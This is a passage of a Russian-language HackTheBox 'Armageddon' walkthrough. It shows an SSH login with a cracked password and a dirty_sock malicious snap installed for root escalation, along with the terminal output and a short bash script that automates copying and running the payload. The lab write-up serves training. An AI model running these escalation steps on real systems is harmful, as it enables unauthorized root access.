# SSH как brucetherealadmin

Как мы знаем, `su` не работал, поэтому я попробовал следующую команду для входа под кодом Bruce через SSH, указав пароль «booboo»:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/armageddon]
└─$ ssh brucetherealadmin@10.10.10.233
The authenticity of host '10.10.10.233 (10.10.10.233)' can't be established.
ECDSA key fingerprint is SHA256:bC1R/FE5sI72ndY92lFyZQt4g1VJoSNKOeAkuuRr4Ao.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.233' (ECDSA) to the list of known hosts.
Password for brucetherealadmin@10.10.10.233: 
Last login: Mon Apr 5 15:06:03 2021 from 10.10.14.56
[brucetherealadmin@armageddon ~]$ cd /tmp
[brucetherealadmin@armageddon tmp]$ sudo snap install --devmode /tmp/dirty.snap 
dirty-sock 0.1 installed
[brucetherealadmin@armageddon tmp]$ su dirty_sock
Password: 
[dirty_sock@armageddon tmp]$ sudo cat /root/root.txt

We trust you have received the usual lecture from the local System Administrator.
It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for dirty_sock: 
d9...[snip]...a4b

```

Теперь мы можем очистить наш snap:

```bash
[brucetherealadmin@armageddon tmp]$ sudo rm dirty.snap
```

Я не удаляю пользователя или меняю пароль, только на случай, если это помешает чужому эксплойту.

### Автоматизация

Мы можем создать очень простую bash-скрипт, чтобы частично автоматизировать вышеописанную процедуру:

```bash
#!/bin/bash
python3 print-snap.py | base64 -d > dirty.snap
scp dirty.snap brucetherealadmin@10.10.10.233:/tmp/dirty.snap
ssh brucetherealadmin@10.10.10.233
```

Затем нам просто нужно указать пароль Bruce и запустить malicious snap после входа под кодом `sudo snap install --devmode /tmp/dirty.snap`.
